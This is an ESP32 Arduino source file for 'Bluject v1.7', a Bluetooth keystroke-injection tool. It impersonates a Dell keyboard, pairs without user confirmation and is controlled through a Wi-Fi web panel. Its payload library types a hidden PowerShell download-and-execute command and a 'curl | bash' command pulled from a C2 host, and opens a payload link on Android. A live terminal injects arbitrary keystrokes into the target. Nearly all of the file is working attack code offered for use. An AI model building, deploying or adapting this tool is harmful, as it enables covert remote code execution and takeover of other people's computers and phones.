/*
 * Project: Bluject v1.7 (Stable Version)
 * Description: Multi-OS BLE HID Injection Tool with Live Connection Polling
 */

#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <BLEHIDDevice.h>
#include <WiFi.h>
#include <WebServer.h>

// --- CONFIGURATION ---
const char* ssid = "Bluject_AP";       
const char* password = "password123";  
String bleName = "Dell Keyboard11XUA"; 

// --- GLOBALS ---
BLEServer* pServer;
BLECharacteristic* pInputChar;      
BLECharacteristic* pMediaChar;      
bool deviceConnected = false;
WebServer server(80);

uint8_t report[8] = {0, 0, 0, 0, 0, 0, 0, 0};

// --- COMPOSITE HID REPORT MAP ---
const uint8_t reportMap[] = {
  // REPORT ID 1: Standard Keyboard
  0x05, 0x01, 0x09, 0x06, 0xA1, 0x01, 0x85, 0x01, 0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 
  0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02, 0x95, 0x01, 0x75, 0x08, 
  0x81, 0x01, 0x95, 0x05, 0x75, 0x01, 0x05, 0x08, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02, 
  0x95, 0x01, 0x75, 0x03, 0x91, 0x01, 0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0x65, 
  0x05, 0x07, 0x19, 0x00, 0x29, 0x65, 0x81, 0x00, 0xC0,

  // REPORT ID 2: Consumer Control (Media & Android Nav)
  0x05, 0x0C, 0x09, 0x01, 0xA1, 0x01, 0x85, 0x02, 0x15, 0x00, 0x26, 0xFF, 0x03, 
  0x19, 0x00, 0x2A, 0xFF, 0x03, 0x75, 0x10, 0x95, 0x01, 0x81, 0x00, 0xC0
};

// --- CORE HID FUNCTIONS ---
void sendKey(uint8_t modifier, uint8_t keycode) {
  if (!deviceConnected) return; // FIX: Prevents crash if trying to send while disconnected
  report[0] = modifier;
  report[2] = keycode;
  pInputChar->setValue(report, 8);
  pInputChar->notify();
  delay(20);
  report[0] = 0;
  report[2] = 0;
  pInputChar->setValue(report, 8);
  pInputChar->notify();
  delay(25);
}

void sendMediaKey(uint16_t keycode) {
  if (!deviceConnected) return; // FIX: Prevents crash if trying to send while disconnected
  uint8_t mediaReport[2] = { (uint8_t)(keycode & 0xFF), (uint8_t)(keycode >> 8) };
  pMediaChar->setValue(mediaReport, 2);
  pMediaChar->notify();
  delay(20);
  mediaReport[0] = 0; mediaReport[1] = 0;
  pMediaChar->setValue(mediaReport, 2);
  pMediaChar->notify();
  delay(25);
}

void typeString(String text) {
  for (int i = 0; i < text.length(); i++) {
    char c = text.charAt(i);
    uint8_t modifier = 0;
    uint8_t key = 0;
    if (c >= 'a' && c <= 'z') key = 0x04 + (c - 'a');
    else if (c >= 'A' && c <= 'Z') { key = 0x04 + (c - 'A'); modifier = 0x02; }
    else if (c >= '1' && c <= '9') key = 0x1E + (c - '1');
    else if (c == '0') key = 0x27;
    else if (c == ' ') key = 0x2C;
    else if (c == '-') key = 0x2D;
    else if (c == '.') key = 0x37;
    else if (c == ':') { key = 0x33; modifier = 0x02; }
    else if (c == '/') key = 0x38;
    else if (c == '"') { key = 0x34; modifier = 0x02; }
    if (key != 0) {
      sendKey(modifier, key);
      delay(random(30, 60));
    }
  }
}

// --- PAYLOAD LIBRARY ---
void triggerPayload(int id) {
  if (!deviceConnected) return; 
  switch (id) {
    case 1: { // WINDOWS
      sendKey(0x08, 0x15); delay(600);
      typeString("powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://C2/p.ps1')\"");
      sendKey(0, 0x28); break;
    }
    case 2: { // MACOS
      sendKey(0x08, 0x2C); delay(600);
      typeString("/bin/bash -c \"curl -s http://C2/p.sh | bash\"");
      sendKey(0, 0x28); break;
    }
    case 3: { // ANDROID
      sendKey(0, 0x2C); delay(800);
      sendKey(0, 0x2C); delay(800);
      sendKey(0x08, 0x2C); delay(1200);
      typeString("https://bit.ly/your-payload"); 
      sendKey(0, 0x28); break;
    }
  }
}

// --- BLE CALLBACKS ---
class BlujectCallbacks : public BLEServerCallbacks {
    void onConnect(BLEServer* pServer) { deviceConnected = true; }
    void onDisconnect(BLEServer* pServer) { 
      deviceConnected = false;
      BLEDevice::startAdvertising(); 
    }
};

class SecurityCallbacks : public BLESecurityCallbacks {
  uint32_t onPassKeyRequest(){ return 123456; }
  void onPassKeyNotify(uint32_t pass_key){}
  bool onConfirmPIN(uint32_t pass_key){ return true; }
  bool onSecurityRequest(){ return true; }
  void onAuthenticationComplete(esp_ble_auth_cmpl_t cmpl){}
};

void startBLE() {
  BLEDevice::init(bleName.c_str());
  BLEDevice::setSecurityCallbacks(new SecurityCallbacks());

  pServer = BLEDevice::createServer();
  pServer->setCallbacks(new BlujectCallbacks());
  
  BLEHIDDevice* hid = new BLEHIDDevice(pServer);
  pInputChar = hid->inputReport(1);   
  pMediaChar = hid->inputReport(2);   
  BLECharacteristic* pOutputChar = hid->outputReport(1); 
  
  hid->reportMap((uint8_t*)reportMap, sizeof(reportMap)); 
  hid->manufacturer()->setValue("Generic Vendor");
  hid->pnp(0x02, 0xe502, 0xa111, 0x0210); 
  hid->hidInfo(0x00, 0x01);
  
  // FIX: Removed hid->setBatteryLevel(98) to stop early notify crash
  hid->startServices();

  BLESecurity *pSecurity = new BLESecurity();
  pSecurity->setAuthenticationMode(ESP_LE_AUTH_REQ_SC_BOND); 
  pSecurity->setCapability(ESP_IO_CAP_NONE);                 
  pSecurity->setInitEncryptionKey(ESP_BLE_ENC_KEY_MASK | ESP_BLE_ID_KEY_MASK);

  BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->setAppearance(0x03C1); 
  pAdvertising->addServiceUUID(hid->hidService()->getUUID());
  pAdvertising->addServiceUUID(hid->batteryService()->getUUID());
  pAdvertising->setScanResponse(true); 
  pAdvertising->setMinPreferred(0x06); 
  pAdvertising->start();
}

void setup() {
  Serial.begin(115200);
  delay(1000); 
  Serial.println("\n--- BLUJECT BOOTING UP ---");
  
  // 1. START BLUETOOTH FIRST
  Serial.println("Attempting to start BLE now...");
  startBLE();
  Serial.println("BLE Started successfully!");

  // 2. WAIT FOR ANTENNA TO SETTLE
  Serial.println("Waiting 2 seconds before starting WiFi...");
  delay(2000); 
  
  // 3. NOW START WIFI
  Serial.println("Attempting to start WiFi AP...");
  WiFi.mode(WIFI_AP);
  if (WiFi.softAP(ssid, password)) {
    Serial.print("WiFi AP Started! Connect to IP: ");
    Serial.println(WiFi.softAPIP());
  } else {
    Serial.println("Critical Error: WiFi AP failed.");
  }

  // 4. START WEB SERVER
  server.on("/", []() {
    String html = R"html(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 15px; margin: 0; }
  .box { border: 1px solid #00ff41; padding: 15px; margin-bottom: 20px; background: #001100; box-shadow: 0 0 10px #00ff41; }
  button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 12px; cursor: pointer; width: 100%; font-weight: bold; }
  button:hover, button:active { background: #00ff41; color: #000; }
  input { background: #000; color: #fff; border: 1px solid #00ff41; padding: 12px; width: calc(100% - 26px); margin-bottom: 10px; }
  .header { text-align: center; color: #fff; border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
  .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; }
  .btn-half { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 8px; }
</style></head><body>
  <div class="header"><h1>BLUJECT v1.7</h1></div>
  
  <div class="box">
    <h3 style="margin-top:0;">TARGET STATUS</h3>
    <p>Target Device: <span id="conn_status" style="color:#ff0041; font-weight:bold;">DISCONNECTED</span></p>
  </div>

  <div class="box">
    <h3 style="margin-top:0;">VIRTUAL KEYBOARD</h3>
    <div class="btn-grid">
      <button onclick="k(0,41)">ESC</button>
      <button onclick="k(0,82)">UP</button>
      <button onclick="k(8,0)">WIN / GUI</button>
      <button onclick="k(0,80)">LEFT</button>
      <button onclick="k(0,81)">DOWN</button>
      <button onclick="k(0,79)">RIGHT</button>
      <button onclick="k(0,43)">TAB</button>
      <button onclick="k(0,40)">ENTER</button>
      <button onclick="k(0,42)">BACKSPC</button>
    </div>
    <h3 style="margin-top:15px; margin-bottom:10px;">NATIVE ANDROID CONTROL</h3>
    <div class="btn-grid">
      <button style="border-color:#ff0041; color:#ff0041;" onclick="m(548)">NATIVE BACK</button>
      <button style="border-color:#ff0041; color:#ff0041;" onclick="m(547)">NATIVE HOME</button>
      <button style="border-color:#ff0041; color:#ff0041;" onclick="m(545)">GEMINI / SEARCH</button>
    </div>
    <div class="btn-half">
      <button onclick="k(8,4)">WIN + A (Gemini)</button>
      <button onclick="m(233)">VOL UP</button>
    </div>
  </div>

  <div class="box">
    <h3 style="margin-top:0;">LIVE TERMINAL</h3>
    <input type="text" id="c" placeholder="Type payload string...">
    <div class="btn-half">
      <button onclick="t()">TYPE ONLY</button>
      <button onclick="k(0,40)">PRESS ENTER</button>
    </div>
  </div>

  <script>
    function f(u){ fetch(u, {method:"POST"}); }
    function k(m, c){ fetch("/key?m=" + m + "&c=" + c, {method:"POST"}); }
    function m(c){ fetch("/media?c=" + c, {method:"POST"}); }
    
    function t(){ 
      var msg = document.getElementById("c").value;
      if(msg.length > 0) fetch("/terminal?msg=" + encodeURIComponent(msg), {method:"POST"});
    }

    // Live Status Polling
    setInterval(() => {
      fetch('/status').then(r => r.text()).then(d => {
        let el = document.getElementById('conn_status');
        if(d === "1") { 
          el.innerText = "CONNECTED"; 
          el.style.color = "#00ff41"; 
        } else { 
          el.innerText = "DISCONNECTED"; 
          el.style.color = "#ff0041"; 
        }
      });
    }, 1500); // Check every 1.5 seconds
  </script>
</body></html>)html";
    server.send(200, "text/html", html);
  });

  server.on("/payload", HTTP_POST, []() {
    triggerPayload(server.arg("id").toInt());
    server.send(200, "text/plain", "Executed");
  });

  server.on("/terminal", HTTP_POST, []() {
    if (server.hasArg("msg")) {
      typeString(server.arg("msg"));
      server.send(200, "text/plain", "Typed");
    }
  });

  server.on("/key", HTTP_POST, []() {
    if (server.hasArg("m") && server.hasArg("c")) {
      sendKey(server.arg("m").toInt(), server.arg("c").toInt());
      server.send(200, "text/plain", "Key Sent");
    }
  });

  server.on("/media", HTTP_POST, []() {
    if (server.hasArg("c")) {
      sendMediaKey(server.arg("c").toInt());
      server.send(200, "text/plain", "Media Sent");
    }
  });

  server.on("/status", HTTP_GET, []() {
    server.send(200, "text/plain", deviceConnected ? "1" : "0");
  });

  server.begin();
  Serial.println("Web Server running. Ready for connections!");
}

void loop() {
  server.handleClient();
  delay(10);
}